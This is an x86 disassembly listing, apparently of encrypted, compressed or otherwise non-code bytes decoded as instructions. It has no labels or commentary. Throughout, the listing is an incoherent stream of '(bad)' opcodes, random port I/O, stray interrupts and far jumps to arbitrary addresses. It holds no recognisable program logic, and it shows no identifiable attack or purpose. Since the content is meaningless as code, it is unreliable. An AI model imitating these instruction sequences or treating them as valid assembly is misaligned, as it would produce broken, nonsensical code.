  4031c0:	test   al,0x91
  4031c2:	(bad)  
  4031c3:	xchg   esi,eax
  4031c4:	push   esp
  4031c5:	lock push edi
  4031c7:	push   ebx
  4031c8:	rcr    DWORD PTR [esi-0x23605dfa],0xe6
  4031cf:	or     eax,0x1a41d3c8
  4031d4:	pop    edx
  4031d5:	xchg   ah,dl
  4031d7:	shl    DWORD PTR [esi],1
  4031d9:	cmc    
  4031da:	push   ebp
  4031db:	and    eax,0x45abe0ec
  4031e0:	push   ds
  4031e1:	push   edx
  4031e2:	xor    eax,0x5f69bb02
  4031e7:	sub    DWORD PTR ds:0x5dc41733,esi
  4031ed:	push   ebx
  4031ee:	ficomp WORD PTR [ecx-0x32]
  4031f1:	dec    ebx
  4031f2:	add    dl,0xd
  4031f5:	add    bl,BYTE PTR [eax-0x3b]
  4031f8:	pop    ecx
  4031f9:	mov    ecx,0x813bf9d1
  4031fe:	in     eax,0x5
  403200:	mov    ebp,DWORD PTR [edx+0x46]
  403203:	fisubr DWORD PTR [eax+0x6]
  403206:	mov    eax,0x5e7ee540
  40320b:	fnstenv [edx+edx*1-0x36fee7ff]
  403212:	lods   al,BYTE PTR ds:[esi]
  403213:	pop    es
  403214:	sbb    al,0x3f
  403216:	jb     0x40328d
  403218:	aad    0x79
  40321a:	ret    0xb564
  40321d:	retf   
  40321e:	inc    eax
  40321f:	ss sbb al,0x3
  403222:	das    
  403223:	xchg   esp,eax
  403224:	call   0xdf3d3ae3
  403229:	push   esi
  40322a:	daa    
  40322b:	fbstp  TBYTE PTR [ebx-0x10bb4444]
  403231:	mov    ecx,0x78462217
  403236:	sub    BYTE PTR [ebx],ah
  403238:	or     BYTE PTR [ebp+esi*8+0x45],ch
  40323c:	scas   eax,DWORD PTR es:[edi]
  40323d:	mov    edx,esp
  40323f:	sbb    eax,0xdf6b0bbb
  403244:	pop    ebx
  403245:	test   eax,0x76de047c
  40324a:	add    eax,0x9f04568d
  40324f:	inc    edx
  403250:	add    BYTE PTR [eax],bh
  403252:	lock call 0x62b4:0xbfc6fb50
  40325a:	stos   BYTE PTR es:[edi],al
  40325b:	fchs   
  40325d:	cld    
  40325e:	pop    edx
  40325f:	pop    ebp
  403260:	mov    ebx,0xb62cbc29
  403265:	in     al,dx
  403266:	shl    BYTE PTR ds:0x3615d16f,1
  40326c:	sub    BYTE PTR [ebx+0x79d9d44],0x5c
  403273:	pop    ecx
  403274:	sahf   
  403275:	pop    edi
  403276:	mov    bh,BYTE PTR [edi]
  403278:	cmc    
  403279:	shl    DWORD PTR [edi],0xd
  40327c:	shl    dl,1
  40327e:	push   edx
  40327f:	pusha  
  403280:	addr16 add edi,ecx
  403283:	xchg   ebp,eax
  403284:	stc    
  403285:	add    dh,ah
  403287:	mov    al,0xc7
  403289:	jp     0x4032c1
  40328b:	xlat   BYTE PTR ds:[ebx]
  40328c:	sub    eax,DWORD PTR [ebx+0x6e]
  40328f:	dec    eax
  403290:	in     eax,0x8e
  403292:	call   0x21a9:0xf583b7b9
  403299:	in     al,0x7
  40329b:	cdq    
  40329c:	(bad)  [ecx+0x50b1ed99]
  4032a2:	cmp    DWORD PTR [edi+ecx*2-0x47],edx
  4032a6:	add    eax,0xb5e4f10d
  4032ab:	and    al,0xa1
  4032ad:	shl    BYTE PTR [eax+0xf5373e8],1
  4032b3:	sub    DWORD PTR [ecx-0x31],eax
  4032b6:	out    0xdc,eax
  4032b8:	sbb    esi,ebx
  4032ba:	daa    
  4032bb:	mov    ecx,0xc9079de7
  4032c0:	pushf  
  4032c1:	jg     0x403283
  4032c3:	mov    bh,0x31
  4032c5:	aaa    
  4032c6:	push   0x40d7874a
  4032cb:	adc    ah,dh
  4032cd:	inc    esp
  4032ce:	leave  
  4032cf:	int    0x55
  4032d1:	test   DWORD PTR [edi+0x38d33d5],ebp
  4032d7:	push   eax
  4032d8:	cwde   
  4032d9:	pushf  
  4032da:	jne    0x4032a0
  4032dc:	dec    ebp
  4032dd:	jbe    0x403310
  4032df:	int    0x94
  4032e1:	pop    ecx
  4032e2:	outs   dx,BYTE PTR ds:[esi]
  4032e3:	xchg   edx,eax
  4032e4:	in     eax,0x4a
  4032e6:	jp     0x4032fb
  4032e8:	out    0xd4,eax
  4032ea:	push   ecx
  4032eb:	jns    0x4032b1
  4032ed:	ficom  WORD PTR [ebp+0x70f012c3]
  4032f3:	sub    DWORD PTR [ebx+edi*4],0x182cafb9
  4032fa:	mov    dh,0x7b
  4032fc:	xor    ecx,DWORD PTR ds:[eax+0x74]
  403300:	ret    
  403301:	inc    edi
  403302:	mov    edi,0x7ca3d7a7
  403307:	mov    ah,BYTE PTR [ecx+0x5b]
  40330a:	mov    eax,0xa865df6e
  40330f:	jg     0x40331d
  403311:	mov    al,ds:0xb5f7ed66
  403316:	sbb    al,dl
  403318:	(bad)  
  40331a:	lahf   
  40331b:	push   0x6050e15c
  403320:	mov    bl,bl
  403322:	jmp    0xd181:0x85c75b6f
  403329:	rcr    DWORD PTR [ebx],1
  40332b:	sbb    eax,0xb4e1f3b2
  403330:	mov    ds:0x6ca8c24b,eax
  403335:	sub    al,0x2c
  403337:	jmp    0x4bca523f
  40333c:	jne    0x403391
  40333e:	aad    0xa7
  403340:	std    
  403341:	dec    ebx
  403342:	or     eax,ebx
  403344:	fistp  DWORD PTR [edx+0x5db94d36]
  40334a:	sbb    edi,DWORD PTR [ecx+ebp*1]
  40334d:	sar    BYTE PTR [ecx],cl
  40334f:	sbb    DWORD PTR [ebx+0x342babb5],0x5184c54c
  403359:	jmp    0xc0d39c80
  40335e:	(bad)  
  40335f:	shl    edi,cl
  403361:	sbb    cl,ah
  403363:	cmp    esp,ebp
  403365:	sub    BYTE PTR [ecx-0x7ec9dc65],0xcc
  40336c:	or     eax,0xc92f30cd
  403371:	adc    ecx,edx
  403373:	and    DWORD PTR [edx-0x3af7eb9d],ebp
  403379:	cmp    edx,DWORD PTR [ebp+0x64]
  40337c:	inc    DWORD PTR [ebp+0x61112980]
  403382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403383:	or     al,0x3e
  403385:	cmp    eax,DWORD PTR [edx+ebx*4+0x96add63]
  40338c:	ins    DWORD PTR es:[edi],dx
  40338d:	stc    
  40338e:	dec    eax
  40338f:	(bad)  
  403390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403391:	pusha  
  403392:	xchg   ecx,ebp
  403394:	or     ah,BYTE PTR [eax+0x510a0cea]
  40339a:	push   0x244fee2e
  40339f:	add    eax,0x7b15b23e
  4033a4:	jmp    0x40341c
  4033a6:	add    edi,edx
  4033a8:	(bad)  
  4033a9:	retf   0x1420
  4033ac:	rcr    ebx,1
  4033ae:	jecxz  0x40333d
  4033b0:	mov    ds:0x6f23a2e3,al
  4033b5:	mov    WORD PTR [edi-0x4f],?
  4033b8:	int3   
  4033b9:	jmp    0x1759:0xe026edb3
  4033c0:	lods   eax,DWORD PTR ds:[esi]
  4033c1:	pop    eax
  4033c2:	popf   
  4033c3:	jle    0x4033a9
  4033c5:	inc    esp
  4033c6:	mov    ds:0x8f45a998,eax
  4033cb:	push   eax
  4033cc:	jp     0x40337c
  4033ce:	sti    
  4033cf:	adc    BYTE PTR [edx+0x64],0xe7
  4033d3:	xor    BYTE PTR [esi-0x45],ch
  4033d6:	daa    
  4033d7:	adc    edx,DWORD PTR [edi]
  4033d9:	test   DWORD PTR [ecx],edx
  4033db:	jo     0x403419
  4033dd:	dec    ebp
  4033de:	enter  0xae92,0xfe
  4033e2:	xor    bl,BYTE PTR [ecx+edi*4]
  4033e5:	xchg   DWORD PTR [esp+eiz*2-0x5149f99b],ebx
  4033ec:	dec    ecx
  4033ed:	ins    BYTE PTR es:[edi],dx
  4033ee:	retf   0x524
  4033f1:	pop    edx
  4033f2:	fidivr DWORD PTR [ebp-0x49]
  4033f5:	mov    edi,DWORD PTR [ebp+0x17fe0cfa]
  4033fb:	(bad)  
  4033fc:	sub    al,bl
  4033fe:	pushf  
  4033ff:	jne    0x403404
  403401:	add    DWORD PTR [esi],esp
  403403:	lods   al,BYTE PTR ds:[esi]
  403404:	mov    esi,0xd6e9778e
  403409:	push   cs
  40340a:	add    BYTE PTR [edx-0x20],bl
  40340d:	jp     0x4033d7
  40340f:	mov    eax,0x1be2434a
  403414:	test   BYTE PTR [ecx+eiz*1+0x188cde82],bh
  40341b:	(bad)  
  40341d:	dec    esp
  40341e:	mov    eax,0x2e082f2b
  403423:	sbb    BYTE PTR [esi+0x5e5a17c5],0xf9
  40342a:	daa    
  40342b:	jl     0x403485
  40342d:	jp     0x403427
  40342f:	pop    eax
  403430:	cmp    eax,0x17cfa90f
  403435:	(bad)  
  403436:	mov    ds:0x81f74d63,eax
  40343b:	scas   eax,DWORD PTR es:[edi]
  40343c:	jo     0x403468
  40343e:	ds popa 
  403440:	mov    ebx,0x777ac8cd
  403445:	int    0x98
  403447:	cmovo  edx,edx
  40344a:	and    BYTE PTR [ebx-0x45],0xc6
  40344e:	imul   eax,DWORD PTR [edi-0x667ecf61],0x25
  403455:	jmp    0x4034ae
  403457:	lea    esp,[edi-0x73]
  40345a:	je     0x403461
  40345c:	and    BYTE PTR [edx-0x75],cl
  40345f:	icebp  
  403460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403461:	push   esp
  403462:	push   esi
  403463:	fnstcw WORD PTR [ecx]
  403465:	xchg   esi,eax
  403466:	or     DWORD PTR [ebx],esp
  403468:	jp     0x40344b
  40346a:	push   ss
  40346b:	cmp    edx,edx
  40346d:	outs   dx,DWORD PTR ds:[esi]
  40346e:	lods   al,BYTE PTR ds:[esi]
  40346f:	xchg   edx,eax
  403470:	push   ebp
  403471:	out    dx,eax
  403472:	push   es
  403473:	lock and dl,ch
  403476:	and    al,0xea
  403478:	lods   al,BYTE PTR ds:[esi]
  403479:	nop
  40347a:	lods   al,BYTE PTR ds:[esi]
  40347b:	ficom  WORD PTR [ebp+0x74]
  40347e:	clc    
  40347f:	imul   bl
  403481:	cmc    
  403482:	inc    esi
  403483:	ds fwait
  403485:	mov    ah,0x33
  403487:	add    bh,ah
  403489:	bound  ebx,QWORD PTR [edx-0x666c1dab]
  40348f:	sbb    dh,BYTE PTR cs:[ecx]
  403492:	add    BYTE PTR [ebx],dh
  403494:	sbb    al,0x7a
  403496:	xchg   ecx,eax
  403497:	adc    DWORD PTR [ebp+0x54],edx
  40349a:	mov    al,ds:0x36a70184
  4034a0:	shr    BYTE PTR [edx-0x13b65e49],1
  4034a6:	cld    
  4034a7:	lods   eax,DWORD PTR ds:[esi]
  4034a8:	and    edi,DWORD PTR [eax+0x63]
  4034ab:	or     eax,0xd45afcb9
  4034b0:	gs jnp 0x4034ea
  4034b3:	sub    eax,0xadabcc31
  4034b8:	(bad)  
  4034b9:	mov    eax,ds:0x5d88dcdb
  4034be:	scas   eax,DWORD PTR es:[edi]
  4034bf:	je     0x4034ba
  4034c1:	adc    al,0xdb
  4034c3:	daa    
  4034c4:	daa    
  4034c5:	pop    ebx
  4034c6:	daa    
  4034c7:	les    eax,FWORD PTR [edx+0x6f95ca62]
  4034cd:	enter  0x1a64,0x7e
  4034d1:	jno    0x4034d2
  4034d3:	das    
  4034d4:	mov    eax,ds:0x5f1a3ca8
  4034d9:	push   DWORD PTR ds:[esi+ebx*8]
  4034dd:	sbb    BYTE PTR [ebx-0x5],ah
  4034e0:	je     0x403506
  4034e2:	push   ecx
  4034e3:	dec    eax
  4034e4:	sub    bl,dh
  4034e6:	mov    al,0x7a
  4034e8:	retf   0x336
  4034eb:	dec    ebx
  4034ec:	out    dx,al
  4034ed:	out    0x4d,al
  4034ef:	stc    
  4034f0:	mov    dh,0x7e
  4034f2:	outs   dx,BYTE PTR ds:[esi]
  4034f3:	inc    ecx
  4034f4:	jmp    0x225f:0x5cc27ee6
  4034fb:	sub    esi,DWORD PTR [eax-0x7c0c8b7c]
  403501:	sahf   
  403502:	outs   dx,DWORD PTR ds:[esi]
  403503:	xchg   esi,eax
  403504:	push   esp
  403505:	mov    al,0x63
  403507:	rep data16 lods al,BYTE PTR ds:[esi]
  40350a:	imul   DWORD PTR [ebp+eiz*4+0x78c20c46]
  403511:	dec    ecx
  403512:	sub    DWORD PTR [ebx-0x5009f173],0x52a105a
  40351c:	add    DWORD PTR [edx-0x4b],0x886373e7
  403523:	popa   
  403524:	pop    ss
  403525:	clc    
  403526:	jbe    0x40352f
  403528:	out    0x5f,eax
  40352a:	sar    BYTE PTR [ebp+0x28352375],1
  403530:	mov    ah,BYTE PTR [edi]
  403532:	xchg   ebp,eax
  403533:	leave  
  403534:	jns    0x403511
  403536:	cld    
  403537:	jnp    0x4034fb
  403539:	pop    DWORD PTR [esi-0x61]
  40353c:	popf   
  40353d:	rstorssp QWORD PTR [esi+0x63]
  403542:	mov    DWORD PTR [edx+0x24ebd14b],edx
  403548:	rcl    bl,cl
  40354a:	data16 hlt 
  40354c:	jo     0x403573
  40354e:	jp     0x403508
  403550:	fistp  DWORD PTR [ebp+ebp*8+0xc5b7f13]
  403557:	mov    dh,0xec
  403559:	inc    al
  40355b:	xlat   BYTE PTR ds:[ebx]
  40355c:	xor    al,0x2
  40355e:	rcl    BYTE PTR [eax-0x376178bf],1
  403564:	mov    ecx,0x7afe4d76
  403569:	adc    cl,ah
  40356b:	rcl    BYTE PTR [eax-0x2c],1
  40356e:	xchg   edi,eax
  40356f:	mov    edi,0x31e19751
  403574:	test   DWORD PTR [eax],0x55800a8c
  40357a:	aam    0x3
  40357c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40357d:	fsub   QWORD PTR [esi+edx*1]
  403580:	dec    edi
  403581:	jecxz  0x4035cb
  403583:	out    0xa7,al
  403585:	lahf   
  403586:	fstp   QWORD PTR [esi+edx*2+0xc]
  40358a:	mov    al,0x40
  40358c:	sbb    DWORD PTR [edx+0x7a],0xffffff86
  403590:	mov    esi,?
  403592:	jb     0x403523
  403594:	jno    0x4035b3
  403596:	jl     0x4035ec
  403598:	(bad)  
  403599:	sub    al,0xf5
  40359b:	sub    bl,ch
  40359d:	fist   DWORD PTR [edx-0x288f67f4]
  4035a3:	int3   
  4035a4:	scas   al,BYTE PTR es:[edi]
  4035a5:	lahf   
  4035a6:	mov    eax,0xb917327f
  4035ab:	call   0xe572:0xec5c1241
  4035b2:	repz pop esp
  4035b4:	aaa    
  4035b5:	mov    ch,0x65
  4035b7:	cmp    eax,0x374ce1d8
  4035bc:	sub    eax,0x668cb7b
  4035c1:	test   DWORD PTR [eax-0x3a717e0],0x975e8d92
  4035cb:	jo     0x40364c
  4035cd:	les    esi,FWORD PTR [edi]
  4035cf:	jne    0x403578
  4035d1:	xor    BYTE PTR [edi+0x5e],ch
  4035d4:	jbe    0x4035f5
  4035d6:	std    
  4035d7:	add    edx,DWORD PTR [edi-0x7f]
  4035da:	push   cs
  4035db:	fdiv   DWORD PTR [ebx+0x74]
  4035de:	xlat   BYTE PTR ds:[ebx]
  4035df:	fidivr WORD PTR [ecx+0x47]
  4035e2:	mov    al,dh
  4035e4:	ret    
  4035e5:	cmp    al,BYTE PTR [ebx]
  4035e7:	jmp    0x2ff44cb6
  4035ec:	jo     0x4035da
  4035ee:	jnp    0x4035fb
  4035f0:	sub    DWORD PTR [ebp+0x50],ecx
  4035f3:	add    eax,0x42aa92f9
  4035f8:	mov    ebp,0xc8056
  4035fd:	and    eax,0xb62ebf0
  403602:	outs   dx,DWORD PTR ds:[esi]
  403603:	xor    al,0x1b
  403605:	mov    bh,0xc5
  403607:	stos   DWORD PTR es:[edi],eax
  403608:	fsubr  QWORD PTR [edx]
  40360a:	or     edx,DWORD PTR [edi+0x378f1390]
  403610:	bound  edx,QWORD PTR [eax]
  403612:	mov    ecx,0xdf1400b3
  403617:	sbb    eax,0x90744787
  40361c:	push   edi
  40361d:	hlt    
  40361e:	(bad)  
  40361f:	js     0x4035f4
  403621:	scas   eax,DWORD PTR es:[edi]
  403622:	jns    0x4035dc
  403624:	push   0xe7e88e58
  403629:	mov    ebx,0x84a113ce
  40362e:	dec    esp
  40362f:	sub    eax,0x8767e792
  403634:	dec    esi
  403635:	jecxz  0x4035e1
  403637:	in     al,dx
  403638:	adc    al,0xf3
  40363a:	xor    al,0xfc
  40363c:	adc    ebp,DWORD PTR [edx+0x2d14ea07]
  403642:	in     al,dx
  403643:	adc    cl,BYTE PTR [ecx]
  403645:	pop    ds
  403646:	in     al,dx
  403647:	mov    al,0x3
  403649:	in     al,0xb2
  40364b:	jbe    0x4036cb
  40364d:	jns    0x403606
  40364f:	dec    esp
  403650:	loope  0x403634
  403652:	cmp    edi,DWORD PTR [ebx]
  403654:	jmp    0xe854:0x2fea9ef2
  40365b:	popf   
  40365c:	jae    0x403656
  40365e:	cwde   
  40365f:	xor    BYTE PTR [ebx+0x34975324],dl
  403665:	inc    esp
  403666:	mov    edi,0x43be66d5
  40366b:	cwde   
  40366c:	imul   edi,DWORD PTR [esp+edx*8],0x275e66f2
  403673:	test   eax,0x4eaf52f1
  403678:	mov    ch,0x77
  40367a:	mov    eax,0xf623a203
  40367f:	xor    eax,0xd64b1d7b
  403684:	mov    ecx,0x4e9807fc
  403689:	mov    dh,0x42
  40368b:	mov    ch,0xf5
  40368d:	dec    esi
  40368e:	jg     0x403626
  403690:	add    BYTE PTR [esi],ch
  403692:	imul   ecx,esi,0x30f1430
  403698:	leave  
  403699:	jb     0x4036e7
  40369b:	push   ebp
  40369c:	fs jbe 0x403673
  40369f:	or     BYTE PTR [edi+ebx*1+0x29],ah
  4036a3:	mov    edi,0xf4c88071
  4036a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a9:	popf   
  4036aa:	push   ss
  4036ab:	and    cl,BYTE PTR [esi+ebx*2+0x62]
  4036af:	xor    eax,DWORD PTR ds:0xed57a674
  4036b5:	inc    esp
  4036b6:	rcr    BYTE PTR [ebx+0xece97c1],1
  4036bc:	leave  
  4036bd:	daa    
  4036be:	cmp    esi,DWORD PTR [edi-0x46]
  4036c1:	jns    0x40365c
  4036c3:	pop    edi
  4036c4:	push   edx
  4036c5:	adc    dl,BYTE PTR [edi+0x5ba4b248]
  4036cb:	adc    eax,0xe662c8db
  4036d0:	sub    DWORD PTR [ebx-0x4500825c],esp
  4036d6:	js     0x403721
  4036d8:	aas    
  4036d9:	addr16 push 0xffffffb3
  4036dc:	cmp    dl,ah
  4036de:	ret    
  4036df:	ds pusha 
  4036e1:	pop    ds
  4036e2:	fdiv   DWORD PTR [edx]
  4036e4:	xor    ebp,ebp
  4036e6:	and    ebp,DWORD PTR [edi+0x3e]
  4036e9:	mov    al,0xd9
  4036eb:	pop    ds
  4036ec:	dec    ebx
  4036ed:	push   ds
  4036ee:	sbb    al,0x53
  4036f0:	imul   esi,esp,0x56
  4036f3:	xchg   esi,eax
  4036f4:	ret    0xa4c6
  4036f7:	fcomip st,st(0)
  4036f9:	push   eax
  4036fa:	cmp    eax,0x2bc97a12
  4036ff:	std    
  403700:	leave  
  403701:	(bad)  
  403702:	adc    DWORD PTR [esi+ebx*2],edi
  403705:	ds mov cl,0x7c
  403708:	cmp    eax,0x31f00560
  40370d:	ss cwde 
  40370f:	mov    esi,0x330f6bf1
  403714:	push   ebp
  403715:	loope  0x4036a1
  403717:	push   0xfffffffd
  403719:	data16 fidivr WORD PTR ds:0x7c22dd47
  403720:	pushf  
  403721:	enter  0x4ffd,0x60
  403725:	in     al,0x2a
  403727:	or     al,0x88
  403729:	or     BYTE PTR [ebp-0xe],ah
  40372c:	cmp    dh,BYTE PTR [ebp+edi*1+0x29a7e3a]
  403733:	mov    WORD PTR [edx],ss
  403735:	retf   
  403736:	(bad)  
  403737:	push   eax
  403738:	mul    DWORD PTR [eax-0x38ff66f4]
  40373e:	in     al,0xe4
  403740:	das    
  403741:	popf   
  403742:	push   0x7
  403744:	aad    0xc8
  403746:	and    al,0x9e
  403748:	in     al,0x65
  40374a:	inc    BYTE PTR [eax]
  40374c:	pop    edx
  40374d:	dec    ebp
  40374e:	shr    BYTE PTR [esi+0x60],1
  403751:	cmp    DWORD PTR [esi+0x13b122d2],ecx
  403757:	mov    ch,ch
  403759:	inc    BYTE PTR [edx+0x5]
  40375c:	xchg   esp,eax
  40375d:	leave  
  40375e:	jb     0x40378b
  403760:	dec    esp
  403761:	pop    ss
  403762:	or     DWORD PTR [ebp-0x620e1af7],ecx
  403768:	lods   al,BYTE PTR ds:[esi]
  403769:	fstp   DWORD PTR [edx-0x58b0a252]
  40376f:	jbe    0x40379b
  403771:	jne    0x40377c
  403773:	or     dl,BYTE PTR [edx+eax*2-0x18]
  403777:	pop    esi
  403778:	xchg   ecx,eax
  403779:	in     al,dx
  40377a:	sbb    DWORD PTR [ebx-0x788d60d2],ecx
  403780:	lods   al,BYTE PTR ds:[esi]
  403781:	xchg   esp,eax
  403782:	and    BYTE PTR [edi+edx*1],0xbf
  403786:	mov    ecx,0xfbd75fe8
  40378b:	or     dl,dl
  40378d:	push   ebx
  40378e:	xchg   ebp,eax
  40378f:	adc    DWORD PTR [edi+0x2d],esi
  403792:	adc    al,0xe
  403795:	pop    ds
  403796:	add    bh,bh
  403798:	(bad)  
  403799:	shl    BYTE PTR [edx],cl
  40379b:	mov    dl,0x8
  40379d:	sub    ah,BYTE PTR ds:0x77a7d043
  4037a3:	es loopne 0x403731
  4037a6:	rcl    eax,1
  4037a8:	retf   0xbf48
  4037ab:	cmp    eax,0x78228d20
  4037b0:	mov    DWORD PTR [ecx-0x27],ecx
  4037b3:	bound  edx,QWORD PTR [edx]
  4037b5:	mov    dh,0xaa
  4037b7:	or     al,0x3c
  4037b9:	rcpps  xmm4,xmm6
  4037bc:	cs out dx,eax
  4037be:	jbe    0x40375f
  4037c0:	sbb    cl,BYTE PTR [ecx-0x37]
  4037c3:	jge    0x4037ae
  4037c5:	mov    ah,0x9a
  4037c7:	jmp    0xe7da3704
  4037cc:	or     al,0xe4
  4037ce:	or     ch,ah
  4037d0:	addr16 push es
  4037d2:	or     BYTE PTR [ebp+0x58],cl
  4037d5:	sub    esi,DWORD PTR [edi+0x27]
  4037d8:	bound  eax,QWORD PTR [edx]
  4037da:	xchg   DWORD PTR [ecx],esp
  4037dc:	dec    eax
  4037dd:	ret    0x43d1
  4037e0:	or     al,0xd4
  4037e2:	test   ah,0xda
  4037e5:	(bad)  
  4037e6:	clc    
  4037e7:	cmp    DWORD PTR [eax+ecx*8+0x27],0xffffffb7
  4037ec:	pop    esi
  4037ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ee:	mov    DWORD PTR [esp+eax*1-0x40dcffbf],edi
  4037f5:	adc    dh,dh
  4037f7:	inc    esp
  4037f8:	mov    ecx,0xa8bec44a
  4037fd:	xchg   eax,esp
  4037ff:	(bad)  [eax]
  403801:	xchg   edx,eax
  403802:	call   0xe1fe9a2e
  403807:	pop    ss
  403808:	xor    BYTE PTR [ecx-0x6e],0x7b
  40380c:	cmp    ecx,ebp
  40380e:	and    BYTE PTR [esi-0x59],al
  403811:	mov    ds:0xc396ade6,al
  403816:	xor    BYTE PTR [esi-0x8],ch
  403819:	arpl   WORD PTR [eax+0x5b],dx
  40381c:	and    esp,eax
  40381e:	iret   
  40381f:	nop
  403820:	cli    
  403821:	arpl   di,bx
  403823:	mov    ah,0x50
  403825:	ret    
  403826:	dec    BYTE PTR [ecx-0x3b73671e]
  40382c:	in     al,0xf9
  40382e:	xor    eax,0x6dc63bc9
  403833:	jg     0x40383d
  403835:	fcom   QWORD PTR [eax+edi*8+0x13]
  403839:	dec    edi
  40383a:	jne    0x403863
  40383c:	test   eax,0xbe9a35
  403841:	(bad)  
  403842:	aad    0x26
  403844:	add    cl,BYTE PTR [ebp+0x2c]
  403847:	ret    0xa4eb
  40384a:	or     cl,BYTE PTR [edx-0x16]
  40384d:	std    
  40384e:	jnp    0x4037d0
  403850:	jl     0x403848
  403852:	or     DWORD PTR [esp+0x0],0xffffffed
  403857:	in     eax,dx
  403858:	iret   
  403859:	(bad)  
  40385a:	std    
  40385b:	dec    edx
  40385c:	mov    ds:0x59c44493,al
  403861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403863:	je     0x40381c
  403865:	inc    eax
  403866:	call   0xd57e66f2
  40386b:	cwde   
  40386c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40386d:	retf   0xe420
  403870:	cmp    eax,0x6033a0a9
  403875:	inc    bl
  403877:	sub    DWORD PTR [edx+edx*8+0x59c64d60],esp
  40387e:	out    0x51,eax
  403880:	xlat   BYTE PTR ds:[ebx]
  403881:	mov    ch,BYTE PTR [eax-0x10]
  403884:	mov    ah,0x8d
  403886:	cmp    DWORD PTR [ebx],ecx
  403888:	sub    al,0xfd
  40388a:	sbb    BYTE PTR [ebx],0xba
  40388d:	repz jecxz 0x4038ac
  403890:	or     DWORD PTR [eax],ecx
  403892:	out    0x5d,al
  403894:	pop    eax
  403895:	or     BYTE PTR [eax-0x58],bl
  403898:	jbe    0x4038e3
  40389a:	add    al,0xf2
  40389c:	pop    ss
  40389d:	sub    eax,0x4d34692c
  4038a2:	sbb    ebp,ebx
  4038a4:	loope  0x403921
  4038a6:	jno    0x4038cc
  4038a8:	outs   dx,DWORD PTR ds:[esi]
  4038a9:	cmp    ecx,ebx
  4038ab:	(bad)  
  4038ac:	jmp    0x33db:0xfbb507d9
  4038b3:	mov    BYTE PTR ds:0x64fb2e0a,0x6e
  4038ba:	adc    esp,DWORD PTR [ebx]
  4038bc:	outs   dx,BYTE PTR ds:[esi]
  4038bd:	(bad)
  4038c1:	dec    eax
  4038c2:	ja     0x403857
  4038c4:	pop    esi
  4038c5:	sbb    DWORD PTR [ecx+ebp*4],0x51
  4038c9:	dec    eax
  4038ca:	lahf   
  4038cb:	call   0xdeeb:0xb4f2c913
  4038d2:	xchg   esp,eax
  4038d3:	(bad)  
  4038d5:	out    dx,eax
  4038d6:	pop    DWORD PTR [ebx]
  4038d8:	cmp    eax,0x1cd9fd63
  4038dd:	adc    BYTE PTR [ebx-0x62c1bf],ch
  4038e3:	in     al,dx
  4038e4:	xor    DWORD PTR [edi],0xffffff9f
  4038e7:	cmp    BYTE PTR [ebx-0x7d],ah
  4038ea:	xchg   BYTE PTR [ebx-0x1b177a7f],dl
  4038f0:	pop    ebx
  4038f1:	push   0xbc9ff9f0
  4038f6:	mov    ds:0xea37f54d,eax
  4038fb:	repz (bad) [esi+ebx*2]
  4038ff:	test   DWORD PTR [ebp+esi*4-0xd],esi
  403903:	or     edi,DWORD PTR [ecx-0x61]
  403906:	sub    BYTE PTR [esi],bh
  403908:	and    ch,bh
  40390a:	cdq    
  40390b:	call   0x38a64b46
  403910:	or     ecx,DWORD PTR [ebx]
  403912:	out    0x3,al
  403914:	push   0x2e
  403916:	test   BYTE PTR [esi+eiz*4+0x2daa411c],bl
  40391d:	dec    ecx
  40391e:	push   cs
  40391f:	inc    ebx
  403920:	aaa    
  403921:	prefetch (bad)
  403922:	or     eax,0xd2e308f1
  403927:	test   BYTE PTR [ebp+0x6fe2006d],bl
  40392d:	je     0x4038d7
  40392f:	or     eax,0x5194ce9d
  403934:	stos   BYTE PTR es:[edi],al
  403935:	dec    eax
  403936:	jno    0x403992
  403938:	lods   eax,DWORD PTR ds:[esi]
  403939:	mov    ch,0x59
  40393b:	adc    ah,BYTE PTR [ebx+0x33]
  40393e:	mov    bl,0xec
  403940:	mov    ebp,0x2f8ad6
  403945:	fld    QWORD PTR [esi]
  403947:	int    0xa1
  403949:	and    DWORD PTR [edi],esi
  40394b:	sbb    eax,0x3ef5b32e
  403950:	push   cs
  403951:	push   ds
  403952:	jg     0x40392c
  403954:	adc    ah,dh
  403956:	scas   eax,DWORD PTR es:[edi]
  403957:	aas    
  403958:	adc    eax,0x97426273
  40395d:	nop
  40395e:	enter  0xd223,0xc9
  403962:	sub    eax,DWORD PTR [eax+0x69fc6b6d]
  403968:	xor    eax,0xb30b67cd
  40396d:	retf   0x98c0
  403970:	fdiv   QWORD PTR [ebp+0x117b2f4c]
  403976:	mov    cl,0xa3
  403978:	xor    DWORD PTR [edx-0x2b16dd26],0xffffff95
  40397f:	add    eax,edi
  403981:	sar    BYTE PTR [ecx+edx*4+0x34],1
  403985:	pop    esp
  403986:	cli    
  403987:	fwait
  403988:	std    
  403989:	push   ecx
  40398a:	into   
  40398b:	(bad)
  40398e:	stos   BYTE PTR es:[edi],al
  40398f:	shr    DWORD PTR [ebx-0x26ead7e9],0x2b
  403996:	xlat   BYTE PTR ds:[ebx]
  403997:	jecxz  0x403949
  403999:	sub    bl,BYTE PTR [ecx-0x33]
  40399c:	sub    al,BYTE PTR [edx+0x9]
  40399f:	stos   BYTE PTR es:[edi],al
  4039a0:	cs out dx,al
  4039a2:	js     0x40393a
  4039a4:	enter  0x6d8b,0x7e
  4039a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039a9:	int    0x2a
  4039ab:	lahf   
  4039ac:	pushf  
  4039ad:	fucomp st(2)
  4039af:	test   eax,0xb2799665
  4039b4:	adc    BYTE PTR [ecx],dh
  4039b6:	stc    
  4039b7:	sub    BYTE PTR [esi+0x3efc5169],dh
  4039bd:	add    esi,ebx
  4039bf:	push   edi
  4039c0:	cmc    
  4039c1:	(bad)  
  4039c2:	stos   DWORD PTR es:[edi],eax
  4039c3:	lods   al,BYTE PTR ds:[esi]
  4039c4:	pop    ebx
  4039c5:	ret    0x5527
  4039c8:	mov    ecx,0x49a3bc0c
  4039cd:	sbb    edx,0xffffff94
  4039d0:	mov    ah,0x4a
  4039d2:	push   ds
